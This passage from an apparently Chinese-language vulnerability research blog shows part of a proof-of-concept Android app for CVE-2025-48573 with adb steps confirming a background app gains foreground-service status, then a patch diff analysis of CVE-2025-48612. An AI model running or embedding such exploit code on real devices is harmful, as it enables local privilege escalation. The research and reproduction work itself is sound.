<span class="line"><span style="color:#999999;--shiki-dark:#666666">            </span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            serviceChannel</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setDescription</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">Channel for Exploit PoC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            serviceChannel</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">enableLights</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#1E754F;--shiki-dark:#4D9375">true</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            serviceChannel</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">setLightColor</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">Color</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">RED</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            manager</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">createNotificationChannel</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">serviceChannel</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    public</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> IBinder </span><span style="color:#59873A;--shiki-dark:#80A665">onBind</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent </span><span style="color:#B07D48;--shiki-dark:#BD976A">intent</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span><span style="color:#1E754F;--shiki-dark:#4D9375"> return</span><span style="color:#1E754F;--shiki-dark:#4D9375"> null</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<h4 id="d-mainactivityjava-启动器"><a class="anchor" href="#d-mainactivityjava-启动器">#</a> D. MainActivity.java (启动器)</h4>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">example</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">cve_2025_48573_poc</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Activity</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Bundle</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> MainActivity</span><span style="color:#AB5959;--shiki-dark:#CB7676"> extends</span><span style="color:#59873A;--shiki-dark:#80A665"> Activity</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    protected</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onCreate</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Bundle </span><span style="color:#B07D48;--shiki-dark:#BD976A">savedInstanceState</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">        super</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onCreate</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">savedInstanceState</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 启动攻击服务</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">        startService</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#1E754F;--shiki-dark:#4D9375">new</span><span style="color:#59873A;--shiki-dark:#80A665"> Intent</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#A65E2B;--shiki-dark:#C99076">this</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> VulnerableService</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">class</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">        </span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 提示用户</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 实际上，你需要在这里让 App 尽快退到后台，或者在 Service 里加个大延时</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 比如：</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // finish(); </span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 甚至 moveTaskToBack(true);</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<h3 id="3复现"><a class="anchor" href="#3复现">#</a> 3.复现</h3>
<h5 id="31编译及安装"><a class="anchor" href="#31编译及安装">#</a> 3.1编译及安装</h5>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120220724372.png" alt="image-20260120220724372"></p>
<p>重命名为CVE-POC</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120220922902.png" alt="image-20260120220922902"></p>
<p>安装：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> install</span><span style="color:#B56959;--shiki-dark:#C98A7D"> CVE-POC.apk</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120221045116.png" alt="image-20260120221045116"></p>
<h4 id="32查看日志"><a class="anchor" href="#32查看日志">#</a> 3.2查看日志</h4>
<p>连接</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> logcat</span><span style="color:#A65E2B;--shiki-dark:#C99076"> -s</span><span style="color:#B56959;--shiki-dark:#C98A7D"> CVE-POC</span><span style="color:#B56959;--shiki-dark:#C98A7D"> AndroidRuntime</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120221221227.png" alt="image-20260120221221227"></p>
<h4 id="33启动app"><a class="anchor" href="#33启动app">#</a> 3.3启动APP</h4>
<p>打开 App，<code>VulnerableService</code> 会启动。</p>
<p><strong>关键操作</strong>：</p>
<ul>
<li>在 <code>VulnerableService</code> 中设置了 5秒 延时。</li>
<li>在打开 App 后，<strong>立即按 Home 键</strong>返回桌面，确保 App 处于<strong>后台状态</strong>。</li>
</ul>
<p><strong>观察结果</strong>：</p>
<ul>
<li><strong>预期（漏洞存在）</strong>：5秒后，日志显示 <code>SUCCESS!</code>，并且你会看到一个通知栏通知 "Exploit Successful"。这证明后台应用成功启动了前台服务。</li>
<li><strong>预期（已修复）</strong>：日志会显示 <code>SecurityException</code> 或者是 <code>BackgroundStartPrivileges</code> 相关的错误，提示应用不允许从后台启动 FGS。</li>
</ul>
<p>启动后可以看到：</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120221424027.png" alt="image-20260120221424027"></p>
<p>【没有弹出通知】终端执行：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> dumpsys</span><span style="color:#B56959;--shiki-dark:#C98A7D"> activity</span><span style="color:#B56959;--shiki-dark:#C98A7D"> services</span><span style="color:#B56959;--shiki-dark:#C98A7D"> com.example.cve_2025_48573_poc</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260120222216578.png" alt="image-20260120222216578"></p>
<p><code>isForeground=true</code>，就证明成功利用漏洞提权，通知弹不弹出来只是 UI 问题。</p>
<h1 id="三-cve-2025-48612"><a class="anchor" href="#三-cve-2025-48612">#</a> 三、CVE-2025-48612</h1>
<h2 id="一漏洞原因"><a class="anchor" href="#一漏洞原因">#</a> （一）漏洞原因</h2>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121103352293.png" alt="image-20260121103352293"></p>
<h3 id="1nvd描述"><a class="anchor" href="#1nvd描述">#</a> 1.NVD描述</h3>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>In multiple locations, there is a possible way for an application on a work profile to set the main user's default NFC payment setting due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.</span></span>
<span class="line"><span>在多个位置，由于输入验证不当，工作配置文件中的应用程序可能设置主用户的默认 NFC 支付设置。这可能导致本地权限提升，而无需额外的执行权限。利用此漏洞无需用户交互。</span></span></code></pre>
<h3 id="2commit信息"><a class="anchor" href="#2commit信息">#</a> 2.commit信息</h3>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>[nfc] Fix string injection in default payment app selector</span></span>
<span class="line"><span>Backwards compatible port of ag/35084316</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[nfc] 修复默认支付应用选择器中的字符串注入问题</span></span>
<span class="line"><span>ag/35084316 的向后兼容端口</span></span></code></pre>
<h3 id="3diff信息"><a class="anchor" href="#3diff信息">#</a> 3.diff信息</h3>
<p>变更了两处：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/packages/apps/Settings/+/aa744e8988f0e7b77a71087edd4d2546b58d2f24/src/com/android/settings/nfc/DefaultPaymentSettings.java">src/com/android/settings/nfc/DefaultPaymentSettings.java </a>[ <a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/packages/apps/Settings/+/aa744e8988f0e7b77a71087edd4d2546b58d2f24%5E!/#F0">diff</a> ]</li>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/packages/apps/Settings/+/aa744e8988f0e7b77a71087edd4d2546b58d2f24/src/com/android/settings/nfc/PaymentBackend.java">src/com/android/settings/nfc/PaymentBackend.java </a>[ <a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/packages/apps/Settings/+/aa744e8988f0e7b77a71087edd4d2546b58d2f24%5E!/#F1">diff</a> ]</li>
</ul>
<p>1.DefaultPaymentSettings.java</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">17</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">17</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">settings</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">nfc</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">settings</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">SettingsEnums</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ComponentName</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> // UI 层不再直接解析/处理 ComponentName</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Context</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">graphics</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">drawable</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Drawable</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">45</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">44</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">9</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Collections</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Comparator</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375"> import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">List</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Map</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> // 进行Key → 对象 的一对一映射</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">function</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Function</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> java</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">stream</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Collectors</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">  // DefaultPaymentSettings handles the NFC default payment app selection.</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">53</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">55</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> static</span><span style="color:#AB5959;--shiki-dark:#CB7676"> final</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> TAG</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">DefaultPaymentSettings</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> PaymentBackend</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mPaymentBackend</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> List</span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#AB5959;--shiki-dark:#CB7676">PaymentAppInfo</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mAppInfos</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD"> //UI 只有顺序</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> Map</span><span style="color:#999999;--shiki-dark:#666666">&lt;</span><span style="color:#AB5959;--shiki-dark:#CB7676">String</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#AB5959;--shiki-dark:#CB7676"> PaymentAppInfo</span><span style="color:#999999;--shiki-dark:#666666">&gt;</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mAppInfos</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//UI 身份映射</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     private</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> FooterPreference</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mFooterPreference</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">@@ </span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">67</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">22</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#2F798A;--shiki-dark:#4C9A91">69</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#2F798A;--shiki-dark:#4C9A91">19</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> @@</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">     </span><span style="color:rgba(255, 18, 18, 0.8);--shiki-dark:rgba(255, 18, 18, 0.8)">}</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">     @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">SuppressWarnings</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">NullAway</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">     protected</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> String </span><span style="color:#59873A;--shiki-dark:#80A665">getDefaultKey</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//返回当前默认应用的 key</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">         PaymentAppInfo</span><span style="color:#B07D48;--shiki-dark:#BD976A"> defaultAppInfo</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B07D48;--shiki-dark:#BD976A"> mPaymentBackend</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">getDefaultApp</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666">;</span><span style="color:#A0ADA0;--shiki-dark:#758575DD">//获取NFC支付app</span></span>
